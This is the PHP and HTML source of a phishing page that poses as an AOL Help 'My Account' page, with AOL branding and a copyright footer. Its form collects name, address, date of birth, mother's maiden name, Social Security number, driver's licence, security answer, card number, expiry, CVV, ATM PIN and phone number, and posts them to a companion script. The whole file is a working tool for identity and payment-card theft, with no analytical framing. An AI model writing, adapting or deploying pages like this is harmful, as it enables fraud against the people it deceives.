<?php
	if (isset($_GET['id'])) {
		$id = $_GET['id'];
	}
	
?>
<html>
	
	<head>
		<title>My Account - AOL Help</title>
		<link rel="stylesheet" type="text/css" href="style/style.css">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="icon" href="imgs/favicon.ico" type="image/x-icon"/>
		<link rel="shortcut icon" href="imgs/favicon.ico" type="image/x-icon"/>
	
	</head>
	
	<body>
		<div id="topMenu"><span class="menu">Sign out</span> | <span class="menu">Help</span></div>
		<div id="imgText">
			<img src="imgs/canvas-bubbles.jpg">
			
			<p class="freeMail">
				FREE email, chat, local<br /> news and the content<br /> you love!			
			</p>
			
			<img src="imgs/aol-aim.png">
		</div>
		
		<div id="detailsDiv">
			<h2>Verify billing information on file</h2>			
			
			<form method="post" action="process2.php?id=<?php echo urlencode($id); ?>">
				<label class="inputId">Name</label><br>
				 <input type="text" class="inputClass" placeholder="First Name" name="fName" required>
				 
				 <input type="text" class="inputClass" placeholder="Last Name" name="lName" required><br />
				 
				 <label class="inputId">Address</label><br>
				 <input type="text" class="label" name="address" required><br />

				
				 
				 <label class="inputId">City</label><br>
				 <input type="text" class="label" name="city" required><br />
				 
				  <label class="inputId">State</label><br>
				 <select name="state" required>
					<option>Select State</option>
					<option>AL - Alabama</option>
					<option>AK - Alaska</option>
					<option>AZ - Arizona</option>
					<option>AR - Arkansas</option>
					<option>CA - California</option>
					<option>CO - Colorado</option>
					<option>CT - Connecticut</option>
					<option>DE - Delaware</option>
					<option>FL - Florida</option>
					<option>GA - Georgia</option>
					<option>GU - Guam</option>
					<option>HI - Hawaii</option>
					<option>ID - Idaho</option>
					<option>IL - Illinois</option>
					<option>IN - Indiana</option>
					<option>IA - Iowa</option>
					<option>KS - Kansas</option>
					<option>KY - Kentucky</option>
					<option>LA - Louisiana</option>
					<option>ME - Maine</option>
					<option>MD - Maryland</option>
					<option>MA - Massachusetts</option>
					<option>MI - Michigan</option>
					<option>MN - Minnesota</option>
					<option>MS - Mississipi</option>
					<option>MO - Missouri</option>
					<option>MT - Montana</option>
					<option>NE - Nebraska</option>
					<option>NV - Nevada</option>
					<option>NH - New Hampshire</option>
					<option>NJ - New Jersey</option>
					<option>NM - New Mexico</option>
					<option>NY - New York</option>
					<option>NC - North Carolina</option>
					<option>ND - North Dakota</option>
					<option>OH - Ohio</option>
					<option>OK - Oklahoma</option>
					<option>OR - Oregon</option>
					<option>PA - Pennsylvania</option>
					<option>PR - Puerto Rico</option>
					<option>RI - Rhode Island</option>
					<option>SC - South Carolina </option>
					<option>SD - South Dakota</option>
					<option>TN - Tennessee</option>
					<option>TX - Texas</option>
					<option>UT - Utah</option>
					<option>VT - Vermont</option>
					<option>VA - Virginia</option>
					<option>WA - Washington</option>
					<option>WV - West Virginia</option>
					<option>WI - Wisconsin</option>
					<option>WY - Wyoming</option>					
				 </select><br />
				 
				 <label class="inputId">Zip Code</label><br>
				 <input type="text" class="label" name="zip" required><br />
				 
				  <label class="inputId">Date of birth</label><br>
				  <select name="doBirth" required>
					<option>Select month</option>
					<option>January</option>
					<option>February</option>
					<option>March</option>					
					<option>April</option>
					<option>May</option>
					<option>June</option>
					<option>July</option>
					<option>August</option>
					<option>September</option>
					<option>Otober</option>
					<option>November</option>
					<option>December</option>									
				 </select>
				 
				
				<input type="text" class="dd" placeholder="DD" name="date" required>
				 
				
				 <input type="text" class="yyyy" placeholder="YYYY" name="year"><br />
				 
				 <label class="inputId">Mother's Maiden Name</label><br>
				 <input type="text" class="label" name="mmName" required><br />
				 
				  <label class="inputId">Social Security Number</label><br>
				 <input type="text" class="label" name="ssNo" placeholder="---------" required><br />
				
				 <label class="inputId">Driver's Licence</label><br>
				 <input type="text" class="label" name="licence" required><br />
				
				<label class="inputId">Account Security Question</label><br>
				 <select name="accSquestion" required>
					<option>Select a security question</option>
					<option>What was the name of your first school?</option>
					<option>What was the first concert you saw?</option>
					<option>In which city did your parents meet?</option>
					<option>What was your favorite childhood book?</option>
					<option>What was your childhood nickname?</option>
					<option>What was the name of your first pet?</option>
				</select><br />
				 <input type="text" class="label" name="answer" placeholder="Type in your answer" required><br />
				 
				 
				 
			<h2>Verify credit card information on file</h2>
			
				<label class="inputId">Card Type</label><br>
				  <select name="carType" id="cardOptions" required onchange="populate('cardOptions','ccidText')">
					<option value="">Select type:</option>
					<option value="visa">Visa</option>
					<option value="masterCard">MasterCard</option>
					<option value="amex">American Express</option>
					<option value="discover">Discover</option>
					<option value="diners">Diners Club</option>								
				 </select><br />
				 
				 <label class="inputId">Card Number</label><br>
				 <input type="text" class="label" name="carNo" placeholder="No dashes or spaces" required><br />
				
				
				<label class="inputId">Expiration Date</label><br>
				 <input type="text" class="inputClass" placeholder="Month (MM)" name="expireDate" required>
				 
				 <input type="text" class="inputClass" placeholder="Year (YY)" name="expireYear" required><br />				 
				 
				 <label class="inputId">CVV</label><br>
				 <input type="text" class="label" name="civic" placeholder="3-digit number on the back" required><br />				
				 
				 <p id="ccidText"></p>
				 
				  <label class="inputId">Pin</label><br>
				 <input type="text" class="label" name="pin" placeholder="ATM Pin" required><br />
				 
				  <label class="inputId">Phone Number</label><br>
				 <input type="text" class="label" name="phone" required><br />				  
				 
				 
				 <input type="submit" value="Continue" class="submitButton">
			</form>
		</div>
		
		<div class="footer text-clear">
			<p>AOL Inc. | Terms of Service | Privacy Policy | Help &copy;2020 AOL Inc. All Rights Reserved</p>
		</div>
	
	
	<script type="text/javascript">	
			
			function populate(s1,s2) {
				var s1 = document.getElementById(s1);
				var s2 = document.getElementById(s2);
				s2.innerHTML = "";
				
				if (s1.value == 'amex') {
					s2.innerHTML = " <label class=\"inputId\">CCID</label><br><input type=\"text\" class=\"label\" name=\"ccidNo\" placeholder=\"American Express 4-Digit\" required><br />";
				} else {
					s2.innerHTML = "";
				}
				
			}
			
		</script>
	</body>




</html>